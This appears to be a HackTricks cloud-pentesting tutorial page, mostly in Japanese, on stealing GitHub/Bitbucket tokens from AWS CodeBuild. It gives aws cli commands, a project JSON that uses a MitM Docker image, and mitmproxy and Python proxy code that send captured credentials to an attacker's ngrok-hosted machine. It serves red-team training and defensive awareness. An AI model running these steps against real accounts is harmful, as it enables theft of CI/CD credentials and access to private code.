# AWS Codebuild - Token Leakage

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Recover Github/Bitbucket Configured Tokens

まず、漏洩する可能性のあるソースクレデンシャルが設定されているか確認します:
```bash
aws codebuild list-source-credentials
```
### Dockerイメージを介して

例えばGithubへの認証がアカウントに設定されている場合、Codebuildを使用してプロジェクトのビルドを実行するための特定のDockerイメージを使用することで、その**アクセス**（**GHトークンまたはOAuthトークン**）を**流出**させることができます。

この目的のために、新しいCodebuildプロジェクトを**作成**するか、既存のプロジェクトの**環境**を変更して**Dockerイメージ**を設定することができます。

使用できるDockerイメージは[https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)です。これは非常に基本的なDockerイメージで、**環境変数 `https_proxy`**、**`http_proxy`**、および**`SSL_CERT_FILE`**を設定します。これにより、**`https_proxy`**および**`http_proxy`**で指定されたホストのトラフィックの大部分を傍受し、**`SSL_CERT_FILE`**で指定されたSSL証明書を信頼することができます。

1. **独自のDocker MitMイメージを作成してアップロード**
* プロキシIPアドレスを設定し、SSL証明書を設定して**Dockerイメージをビルド**するためのリポジトリの指示に従います。
* メタデータエンドポイントへのリクエストを傍受しないように**`http_proxy`を設定しないでください**。
* **`ngrok`**を使用して、`ngrok tcp 4444`のようにプロキシをホストに設定することができます。
* Dockerイメージがビルドされたら、それを**パブリックリポジトリ**（Dockerhub、ECRなど）に**アップロード**します。
2. **環境を設定**
* **新しいCodebuildプロジェクトを作成**するか、既存のプロジェクトの環境を**変更**します。
* プロジェクトが**前に生成されたDockerイメージ**を使用するように設定します。

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **ホストにMitMプロキシを設定**

* **Githubリポジトリ**に示されているように、次のようなものを使用できます:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
**mitmproxyバージョンは9.0.1を使用**しましたが、バージョン10では動作しない可能性が報告されています。
{% endhint %}

4. **ビルドを実行して資格情報をキャプチャする**

*   **Authorization**ヘッダーにトークンが表示されます:

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

これはaws cliからも以下のように実行できます

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~Via HTTP protocol~~

{% hint style="success" %}
**この脆弱性は2023年2月20日の週（おそらく金曜日）にAWSによって修正されました。そのため、攻撃者はもうこれを悪用できません :)**
{% endhint %}

攻撃者が**CodeBuild上で昇格された権限を持っている場合、設定されたGithub/Bitbucketトークン**や、OAuthを介して権限が設定されている場合は**コードにアクセスするために使用される一時的なOAuthトークン**を漏洩させることができます。

* 攻撃者は環境変数**http\_proxy**と**https\_proxy**をCodeBuildプロジェクトに追加し、自分のマシンを指すように設定できます（例：`http://5.tcp.eu.ngrok.io:14972`）。

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* 次に、githubリポジトリのURLをHTTPSではなくHTTPを使用するように変更します。例：\*\*http://\*\*github.com/carlospolop-forks/TestActions
* その後、[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)の基本的な例を、プロキシ変数（http\_proxyおよびhttps\_proxy）で指定されたポートで実行します。
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* 最後に、**Build the project**をクリックすると、**credentials**が**クリアテキスト**（base64）でmitmポートに送信されます：

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
これで攻撃者は自分のマシンからトークンを使用し、その特権をすべてリストし、CodeBuildサービスを直接使用するよりも簡単に（悪）用することができます。
{% endhint %}

{% hint style="success" %}
AWS Hackingを学び、練習する:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingを学び、練習する: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**subscription plans**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f)または[**telegram group**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローしてください。
* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。

</details>
{% endhint %}
